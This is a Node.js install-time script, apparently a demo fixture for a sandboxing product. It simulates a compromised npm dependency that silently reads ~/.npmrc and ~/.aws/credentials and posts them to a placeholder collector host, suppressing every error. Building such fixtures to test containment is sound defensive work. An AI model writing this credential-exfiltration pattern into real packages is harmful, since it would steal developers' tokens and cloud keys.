'use strict';

/**
 * SECURITY DEMO FIXTURE - DO NOT USE IN PRODUCTION.
 *
 * This file intentionally simulates a compromised dependency: it collects local
 * credential files and attempts to exfiltrate them. It exists only so that a
 * sandboxing product can demonstrate that it contains this behaviour.
 *
 * It is designed to be completely inert and non-fatal:
 *   - Node built-ins only (no shell commands, no dependencies).
 *   - Every failure path is caught, so `npm install` always succeeds.
 *   - A 5 second timeout prevents a hanging install.
 */

const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

const ENDPOINT_HOST = 'collector.airlock-demo.invalid';
const ENDPOINT_PATH = '/upload';
const TIMEOUT_MS = 5000;

/**
 * Read a file and return its contents, or null if it cannot be read.
 * Never throws.
 *
 * @param {string} file - Absolute path to the file.
 * @returns {?string}
 */
function readFileOrNull(file) {
  try {
    if (!fs.existsSync(file)) {
      return null;
    }
    const stat = fs.statSync(file);
    if (!stat.isFile()) {
      return null;
    }
    return fs.readFileSync(file, 'utf8');
  } catch (err) {
    return null;
  }
}

/**
 * Collect the demo canary credential files from the user's home directory.
 * Never throws.
 *
 * @returns {Object}
 */
function collectFiles() {
  const home = os.homedir();
  const targets = {
    '.npmrc': path.join(home, '.npmrc'),
    '.aws/credentials': path.join(home, '.aws', 'credentials'),
  };

  const found = {};
  for (const key of Object.keys(targets)) {
    const contents = readFileOrNull(targets[key]);
    if (contents !== null) {
      found[key] = contents;
    }
  }
  return found;
}

/**
 * POST the collected files as JSON to the demo collector.
 * Never throws; every failure path resolves the callback exactly once.
 *
 * A watchdog timer runs for the whole operation, so the process is guaranteed
 * to finish within TIMEOUT_MS even if DNS resolution never completes (in which
 * case no socket is ever created and the socket timeout would never fire).
 *
 * @param {Object} data - Payload to send.
 * @param {Function} done - Called exactly once when finished (success or not).
 * @returns {void}
 */
function upload(data, done) {
  let finished = false;
  let request = null;
  let watchdog = null;

  const finish = () => {
    if (finished) {
      return;
    }
    finished = true;
    if (watchdog !== null) {
      clearTimeout(watchdog);
      watchdog = null;
    }
    if (request !== null) {
      try {
        request.destroy();
      } catch (err) {
        /* ignore */
      }
    }
    done();
  };

  try {
    const body = JSON.stringify(data);

    const options = {
      host: ENDPOINT_HOST,
      path: ENDPOINT_PATH,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent': 'left-padder/1.4.3 (airlock-demo-fixture)',
      },
      timeout: TIMEOUT_MS,
    };

    request = https.request(options, (res) => {
      // Drain the response so the socket can be released, then finish.
      res.resume();
      res.on('end', finish);
      res.on('error', finish);
    });

    request.on('timeout', () => {
      // Socket-level timeout: tear the request down and finish.
      finish();
    });

    request.on('error', finish);

    // Unconditional watchdog: bounds the whole attempt, including DNS lookups.
    watchdog = setTimeout(finish, TIMEOUT_MS);

    request.end(body);
  } catch (err) {
    finish();
  }
}

/**
 * Entry point. Collects files and uploads them. Never throws and never exits
 * with a non-zero status code.
 *
 * @returns {void}
 */
function main() {
  try {
    const data = collectFiles();
    upload(data, () => {
      // Intentionally do nothing: this fixture must be silent and inert.
    });
  } catch (err) {
    // Swallow everything so that `npm install` is never disturbed.
  }
}

main();
